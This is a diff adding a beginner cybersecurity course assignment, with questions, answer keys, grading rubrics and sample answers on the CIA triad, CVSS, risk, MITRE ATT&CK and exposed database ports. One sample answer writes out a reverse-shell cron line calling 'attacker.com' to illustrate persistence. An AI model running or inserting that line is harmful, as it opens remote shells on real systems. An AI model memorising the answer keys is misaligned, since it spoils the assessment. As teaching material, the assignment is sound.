@@ -1,0 +1,212 @@
+title: "Threat Landscape & Cryptography Assignment"
+category: "cybersecurity"
+difficulty: "beginner"
+estimated_minutes: 30
+related_lesson: "01_threat_landscape"
+instructions: |
+  Demonstrate your understanding of the cybersecurity threat landscape and foundational
+  cryptographic concepts by completing the tasks below.
+  Multiple-choice questions are graded instantly. Written and practical answers are graded
+  by AI and include detailed feedback explaining what you got right and what to improve.
+
+tasks:
+  - id: 1
+    type: "multiple_choice"
+    points: 20
+    question: "A company's public web application is defaced by an attacker who replaces the homepage content with a political manifesto. The company's database and customer data remain intact and unread. Which property of the CIA triad is PRIMARILY violated?"
+    options:
+      - "Confidentiality — customer data was exposed to the attacker"
+      - "Integrity — the website content was unauthorisedly modified"
+      - "Availability — the website is inaccessible to legitimate users"
+      - "Non-repudiation — the company cannot prove who made the changes"
+    answer: 1
+    explanation: "Integrity is the property ensuring data has not been unauthorisedly modified or destroyed. A website defacement is a textbook integrity violation — the attacker modified content they had no authority to change. Confidentiality (data read) and Availability (service down) are not the primary violations here since the data was not read and the site remained technically accessible — just with altered content. Non-repudiation is a property of digital signatures, not the primary CIA concern in this scenario."
+
+  - id: 2
+    type: "multiple_choice"
+    points: 20
+    question: "A CVSS v3.1 score of 10.0 is assigned to a vulnerability in an internet-facing web server. The vector string is AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. What does 'PR:N' (Privileges Required: None) specifically mean in the context of this vulnerability?"
+    options:
+      - "The attacker needs network administrator privileges to exploit this vulnerability"
+      - "The vulnerability can only be exploited without any network connectivity"
+      - "No authentication or special privileges are required — any anonymous user on the internet can attempt exploitation"
+      - "The vulnerability does not result in privilege escalation on the target system"
+    answer: 2
+    explanation: "Privileges Required (PR) in CVSS v3.1 measures the level of privileges an attacker must possess BEFORE exploiting the vulnerability. PR:N (None) means no authentication whatsoever is required — an unauthenticated, anonymous attacker on the internet can attempt the exploit. This is the worst-case value and significantly raises the CVSS score. PR:L would require low-privilege (basic user) authentication; PR:H would require administrative credentials. Combined with AV:N (network accessible), PR:N represents the most dangerous exploitability scenario."
+
+  - id: 3
+    type: "short_answer"
+    points: 25
+    question: |
+      Explain the difference between a vulnerability, a threat, and a risk in cybersecurity.
+      Use a concrete real-world example to illustrate all three concepts in a single scenario
+      (e.g., involving a specific type of system, a specific attacker, and a specific potential outcome).
+      Your answer should be 150–300 words.
+    rubric: |
+      Award full marks (25 points) if the answer:
+      1. (8 pts) Correctly defines vulnerability as a weakness in a system/software/process
+         that could be exploited (e.g., unpatched software, misconfiguration, weak password policy).
+      2. (8 pts) Correctly defines threat as a potential cause of an incident — something that
+         MIGHT exploit a vulnerability (intentional: attacker; accidental: user error; environmental: flood).
+      3. (9 pts) Correctly defines risk as the product of likelihood and impact (Risk = Likelihood × Impact),
+         and uses a coherent real-world example that ties all three together clearly.
+      Deduct 5 pts if no concrete example is provided.
+      Deduct 3 pts if risk is defined without mentioning both likelihood and impact.
+      Award partial credit (10-15 pts) if two out of three concepts are correctly addressed.
+    sample_answer: |
+      In cybersecurity, these three terms have precise, distinct meanings defined in NIST SP 800-30:
+
+      A **vulnerability** is a weakness in a system, application, or process that could be exploited
+      to cause harm. Example: a hospital's patient records system is running an unpatched version of
+      Apache with a known remote code execution vulnerability (CVE-2021-41773, CVSS 9.8).
+
+      A **threat** is a potential cause of an unwanted incident — something that might exploit that
+      vulnerability. Threats can be intentional (a ransomware group scanning for vulnerable Apache
+      servers), accidental (a misconfigured backup that exposes the database), or environmental
+      (a power outage). In our example, the threat is a ransomware gang actively exploiting CVE-2021-41773.
+
+      **Risk** is the combination of the likelihood that the threat will exploit the vulnerability and
+      the impact if it does: Risk = Likelihood × Impact. In our example, the risk is HIGH because:
+      (a) the likelihood is high — exploit code for CVE-2021-41773 is publicly available and threat
+      actors are actively scanning for it; and (b) the impact is critical — a ransomware attack on
+      hospital records could endanger patient lives, result in regulatory fines (HIPAA), and cause
+      multi-million-dollar recovery costs.
+
+      The difference matters: a vulnerability is a flaw that EXISTS; a threat is something that MIGHT
+      exploit it; risk is the assessed PROBABILITY and CONSEQUENCE of that exploitation occurring.
+
+  - id: 4
+    type: "short_answer"
+    points: 20
+    question: |
+      The MITRE ATT&CK framework organises adversary behaviour into tactics and techniques.
+      Choose ANY TWO of the following ATT&CK tactics and for each:
+        (a) explain what the tactic represents in the attack kill chain
+        (b) give ONE specific technique (with its T-number) that falls under it
+        (c) describe ONE detection method a SOC analyst could use
+
+      Tactics to choose from: Initial Access, Persistence, Credential Access, Lateral Movement, Exfiltration.
+    rubric: |
+      Award full marks (20 points) if the answer covers both tactics (10 pts each) with:
+      (a) A clear explanation of the tactic's role in the kill chain (3 pts per tactic)
+      (b) A plausible T-number and technique name (e.g., T1566 Phishing for Initial Access) (4 pts per tactic)
+      (c) A realistic detection method (e.g., email gateway filtering + user-reported phishing for Initial Access;
+          monitoring cron tab changes / systemd unit file creation for Persistence) (3 pts per tactic)
+      Accept any reasonable T-numbers and techniques from the official ATT&CK Enterprise matrix.
+      Deduct 2 pts per tactic if the T-number is wrong but technique name is plausible.
+    sample_answer: |
+      **Tactic 1: Initial Access (TA0001)**
+      (a) Initial Access is the first tactic where the adversary attempts to gain a foothold in
+      the target environment. It represents the moment the attacker transitions from external
+      reconnaissance to having code or presence inside the target network.
+      (b) T1566.001 — Spear Phishing with Attachment: the attacker sends a targeted email to a
+      specific employee with a malicious Office document (macro-enabled .docm) or PDF exploit.
+      (c) Detection: Configure email gateway to sandbox attachments; enable Microsoft Defender for
+      Office 365 or Proofpoint Targeted Attack Protection; monitor for suspicious Office process
+      child processes (winword.exe spawning cmd.exe or powershell.exe) using EDR tools.
+
+      **Tactic 2: Persistence (TA0003)**
+      (a) Persistence ensures the attacker maintains access across reboots, credential changes,
+      or other interruptions — without persistence, losing the session means starting over.
+      (b) T1053.003 — Scheduled Task/Job: Cron: the attacker adds a malicious cron job (e.g.,
+      `* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1`) to re-establish a reverse
+      shell every minute, surviving a SSH session timeout.
+      (c) Detection: Audit crontab changes using Linux auditd (`auditctl -w /etc/crontab -p wa`);
+      alert on new or modified cron jobs in /etc/cron.* and /var/spool/cron; monitor for
+      outbound connection attempts from cron-spawned processes using EDR network telemetry.
+
+  - id: 5
+    type: "practical"
+    points: 15
+    question: |
+      You are a junior security analyst at a company. A colleague runs the following command
+      on a Linux web server and pastes the output to you:
+
+      ```
+      $ ss -tlnp
+      Netid  State   Local Address:Port  Process
+      tcp    LISTEN  0.0.0.0:22         users:(("sshd",pid=1234,fd=3))
+      tcp    LISTEN  0.0.0.0:80         users:(("nginx",pid=5678,fd=6))
+      tcp    LISTEN  0.0.0.0:443        users:(("nginx",pid=5678,fd=7))
+      tcp    LISTEN  0.0.0.0:3306       users:(("mysqld",pid=9012,fd=23))
+      tcp    LISTEN  0.0.0.0:6379       users:(("redis-server",pid=2345,fd=4))
+      tcp    LISTEN  0.0.0.0:27017      users:(("mongod",pid=3456,fd=9))
+      ```
+
+      This is an internet-facing server with a public IP address.
+
+      (a) Identify the THREE most serious security issues visible in this output and explain why each is dangerous.
+      (b) For each issue, provide the specific iptables command that would fix it.
+      (c) Explain what the CIA triad property is violated by each exposure (one per finding).
+    rubric: |
+      Award up to 15 points. Expected findings (5 pts each — 1 for identification, 2 for explanation, 2 for fix):
+
+      Finding 1 (5 pts): MySQL (port 3306) bound to 0.0.0.0 — exposed to the internet.
+      - Danger: Any attacker can attempt authentication against the database directly,
+        bypassing all application-layer security. MySQL should only be accessible from localhost
+        or the application server's internal IP.
+      - CIA: Confidentiality (data can be read/stolen) and Integrity (data can be modified)
+      - Fix: `sudo iptables -A INPUT -p tcp --dport 3306 -s 127.0.0.1 -j ACCEPT`
+              `sudo iptables -A INPUT -p tcp --dport 3306 -j DROP`
+
+      Finding 2 (5 pts): Redis (port 6379) bound to 0.0.0.0 — exposed to the internet.
+      - Danger: Redis has no authentication by default in older versions. An exposed Redis
+        instance allows an attacker to read/write all cached data (session tokens, API keys),
+        achieve RCE via the SLAVEOF/CONFIG SET replication trick, or write SSH keys.
+      - CIA: Confidentiality (session data exposure), Integrity (data corruption, RCE)
+      - Fix: `sudo iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT`
+              `sudo iptables -A INPUT -p tcp --dport 6379 -j DROP`
+
+      Finding 3 (5 pts): MongoDB (port 27017) bound to 0.0.0.0 — exposed to the internet.
+      - Danger: MongoDB historically shipped with no authentication enabled by default.
+        Shodan has indexed hundreds of thousands of exposed MongoDB instances with gigabytes
+        of sensitive data freely accessible. Even with auth, direct internet exposure is wrong.
+      - CIA: Confidentiality (data read), Integrity (data deletion/ransomware), Availability
+      - Fix: `sudo iptables -A INPUT -p tcp --dport 27017 -s 127.0.0.1 -j ACCEPT`
+              `sudo iptables -A INPUT -p tcp --dport 27017 -j DROP`
+
+      Also accept SSH (port 22) exposed to internet as a valid finding (brute force risk).
+      Award partial credit for partially correct answers.
+    sample_answer: |
+      **(a) Three Critical Security Issues:**
+
+      **Issue 1: MySQL (port 3306) exposed to the internet (0.0.0.0)**
+      MySQL is a database server that should never be directly accessible from the internet.
+      Any attacker can probe the login prompt, attempt brute-force or credential stuffing,
+      or exploit authentication bypass vulnerabilities. If MySQL has a CVE (e.g., a known
+      auth bypass), the entire database is at risk. CIA Violation: **Confidentiality** (data
+      can be exfiltrated) and **Integrity** (data can be modified or deleted).
+
+      **Issue 2: Redis (port 6379) exposed to the internet (0.0.0.0)**
+      Redis is an in-memory data store often used for session caching. Older Redis versions
+      ship with no authentication. An exposed Redis instance allows an attacker to read all
+      session tokens (account takeover), modify cached data, or use the SLAVEOF command to
+      achieve remote code execution. CIA Violation: **Confidentiality** (session tokens stolen)
+      and **Integrity** (RCE capability).
+
+      **Issue 3: MongoDB (port 27017) exposed to the internet (0.0.0.0)**
+      MongoDB instances have historically been deployed without authentication. Thousands of
+      exposed MongoDB instances have been ransomed — attackers delete data and demand payment
+      for restoration. CIA Violation: **Confidentiality** (data read), **Integrity** (data
+      deletion), and **Availability** (ransom destruction).
+
+      **(b) iptables Fixes:**
+
+      ```bash
+      # Fix MySQL — allow only localhost
+      sudo iptables -A INPUT -p tcp --dport 3306 -s 127.0.0.1 -j ACCEPT
+      sudo iptables -A INPUT -p tcp --dport 3306 -j DROP
+
+      # Fix Redis — allow only localhost
+      sudo iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
+      sudo iptables -A INPUT -p tcp --dport 6379 -j DROP
+
+      # Fix MongoDB — allow only localhost
+      sudo iptables -A INPUT -p tcp --dport 27017 -s 127.0.0.1 -j ACCEPT
+      sudo iptables -A INPUT -p tcp --dport 27017 -j DROP
+      ```
+
+      **(c) CIA Violations:**
+      - MySQL: Confidentiality (data stolen) + Integrity (data modified)
+      - Redis: Confidentiality (session tokens) + Integrity (RCE)
+      - MongoDB: Confidentiality + Integrity + Availability (ransom destruction)
